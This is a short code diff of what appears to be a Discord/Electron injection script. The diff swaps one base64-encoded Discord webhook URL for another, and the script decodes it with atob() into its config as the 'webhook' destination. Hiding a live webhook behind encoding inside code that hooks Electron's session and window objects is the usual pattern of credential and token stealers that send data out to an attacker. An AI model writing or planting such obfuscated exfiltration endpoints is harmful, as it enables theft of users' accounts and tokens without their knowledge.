@@ -4,7 +4,7 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
-const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MzMxNDgxNzU3NDUwNjUxNi9vYjhMNnF6VjBWQnhDVDZQdXdTTmRiNjRoOW51a2VYTzI3dTRhT2JOenlONU12TjZrZi1Xc1dTem9HS1NKQWdEM1JVTA=='
+const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0NDM2MzI4Mzc4ODczMDM3OC9iM3A3NEZaVDctdkFaRmt3ZDN4TktySGc4cktfdExidU4wT0VmREFaVGtjaUd4TnRUeC15SkxkVDVUbnRJZm1qT05rTw=='
 
 const config = {
   webhook: atob(encodedHook),
